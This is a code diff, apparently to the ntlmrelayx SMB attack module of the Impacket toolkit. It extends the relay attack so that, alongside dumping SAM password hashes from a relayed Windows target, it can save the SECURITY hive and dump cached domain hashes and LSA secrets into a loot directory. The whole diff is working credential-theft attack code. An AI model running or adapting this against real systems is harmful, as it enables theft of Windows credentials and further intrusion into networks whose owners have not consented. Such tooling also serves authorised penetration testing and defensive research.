@@ -36,8 +36,8 @@ PROTOCOL_ATTACK_CLASS = "SMBAttack"
 class SMBAttack(ProtocolAttack):
     """
     This is the SMB default attack class.
-    It will either dump the hashes from the remote target, or open an interactive
-    shell if the -i option is specified.
+    It will either dump SAM hashes and, when requested, LSA secrets from the
+    remote target, or open an interactive shell if the -i option is specified.
     """
     PLUGIN_NAMES = ["SMB"]
     def __init__(self, config, SMBClient, username, target=None, relay_client=None):
@@ -157,9 +157,11 @@ class SMBAttack(ProtocolAttack):
                     LOG.error(str(e))
 
             else:
-                from impacket.examples.secretsdump import RemoteOperations, SAMHashes
+                from impacket.examples.secretsdump import RemoteOperations, SAMHashes, LSASecrets
                 from impacket.examples.ntlmrelayx.utils.enum import EnumLocalAdmins
+                import os
                 samHashes = None
+                lsaSecrets = None
                 try:
                     # We have to add some flags just in case the original client did not
                     # Why? needed for avoiding INVALID_PARAMETER
@@ -197,16 +199,47 @@ class SMBAttack(ProtocolAttack):
                     else:
                         bootKey = remoteOps.getBootKey()
                         remoteOps._RemoteOperations__serviceDeleted = True
-                        samFileName = remoteOps.saveSAM()
-                        samHashes = SAMHashes(samFileName, bootKey, isRemote = True)
-                        samHashes.dump()
-                        samHashes.export(self.__SMBConnection.getRemoteHost()+'_samhashes')
-                        LOG.info("Done dumping SAM hashes for host: %s", self.__SMBConnection.getRemoteHost())
+
+                        sam_filename = os.path.join(self.config.lootdir, self.__SMBConnection.getRemoteHost() + '_samhashes') if self.config.lootdir else self.__SMBConnection.getRemoteHost() + '_samhashes'
+                        cached_filename = os.path.join(self.config.lootdir, self.__SMBConnection.getRemoteHost() + '_cachedhashes') if self.config.lootdir else self.__SMBConnection.getRemoteHost() + '_cachedhashes'
+                        lsa_filename = os.path.join(self.config.lootdir, self.__SMBConnection.getRemoteHost() + '_lsasecrets') if self.config.lootdir else self.__SMBConnection.getRemoteHost() + '_lsasecrets'
+
+                        try:
+                            samFileName = remoteOps.saveSAM()
+                            samHashes = SAMHashes(samFileName, bootKey, isRemote = True)
+                            samHashes.dump()
+                            samHashes.export(sam_filename)
+                            LOG.info("Done dumping SAM hashes for host: %s", self.__SMBConnection.getRemoteHost())
+                        except Exception as e:
+                            LOG.error("Failed to dump SAM hashes: %s", str(e))
+
+                        if self.config.dumpLSA:
+                            try:
+                                securityFileName = remoteOps.saveSECURITY()
+                                lsaSecrets = LSASecrets(securityFileName, bootKey, remoteOps, isRemote = True)
+                                lsaSecrets.dumpCachedHashes()
+                                lsaSecrets.exportCached(cached_filename)
+                                lsaSecrets.dumpSecrets()
+                                lsaSecrets.exportSecrets(lsa_filename)
+                                LOG.info("Done dumping LSA secrets for host: %s", self.__SMBConnection.getRemoteHost())
+                            except Exception as e:
+                                LOG.error("Failed to dump LSA secrets: %s", str(e))
                 except Exception as e:
                     LOG.error(str(e))
                 finally:
                     if samHashes is not None:
-                        samHashes.finish()
+                        try:
+                            samHashes.finish()
+                        except Exception as e:
+                            LOG.error("Failed to clean up SAM hive: %s", str(e))
+                    if lsaSecrets is not None:
+                        try:
+                            lsaSecrets.finish()
+                        except Exception as e:
+                            LOG.error("Failed to clean up SECURITY hive: %s", str(e))
                     if remoteOps is not None:
-                        remoteOps.finish()
+                        try:
+                            remoteOps.finish()
+                        except Exception as e:
+                            LOG.error("Failed to restore remote operations state: %s", str(e))
                 
